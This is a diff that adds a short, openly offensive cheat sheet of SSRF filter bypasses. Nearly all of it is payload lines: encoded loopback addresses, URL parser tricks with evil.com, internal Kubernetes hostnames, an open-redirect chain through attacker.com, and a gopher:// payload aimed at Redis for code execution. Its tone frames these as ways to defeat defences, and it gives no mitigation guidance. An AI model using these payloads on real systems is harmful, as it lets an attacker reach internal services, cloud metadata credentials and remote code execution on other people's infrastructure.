@@ -1,0 +1,47 @@
+SSRF Bypasses
+Sometimes apps try to block internal addresses like 127.0.0.1, localhost, or 169.254.169.254.
+These filters are usually weak as hell and can be dodged with tricks.
+
+The goal is to still make the server reach internal stuff
+like cloud metadata endpoints, Redis, admin panels, etc.
+
+Below are ways to get around dumb filters.
+
+IP Obfuscation
+These bypass filters that only check for the normal 127.0.0.1 format.
+http://127.0.0.1          → normal loopback
+http://2130706433         → decimal for 127.0.0.1
+http://0177.0.0.1         → octal version
+http://0x7f000001         → hex encoded IP
+All of these still hit localhost, but they look different in the URL.
+
+URL Obfuscation Tricks
+Trick the parser or bypass string checks.
+http://127.0.0.1@evil.com        → looks like 127.0.0.1, but browser goes to evil.com
+http://localhost%2f..%2fadmin   → encoded slashes to bypass path filters
+http://127.0.0.1#@evil.com      → everything after # is ignored in requests
+These bypass filters that just check for exact strings.
+
+DNS Tricks & Internal Hosts
+Some apps allow internal domains or things behind a firewall.
+
+http://localhost.local
+http://internal/
+http://kubernetes.default.svc/
+Sometimes the DNS name isn’t blocked, even if the IP is.
+
+Open Redirect Chains
+You point the app to a site that redirects to the real internal target.
+http://attacker.com/redirect?to=http://127.0.0.1
+If the app follows redirects blindly, you can bounce it wherever you want.
+
+Gopher Protocol (Advanced)
+Used to send raw TCP payloads.
+
+gopher://127.0.0.1:6379/_DATA_HERE
+Useful for SSRF-to-RCE attacks on things like Redis or Memcached.
+
+Filters usually suck. If they block "127.0.0.1" but not decimal, you win.
+If they block by hostname, use IPs. If they block IPs, use redirects or encoding.
+Just keep twisting the knife.
+
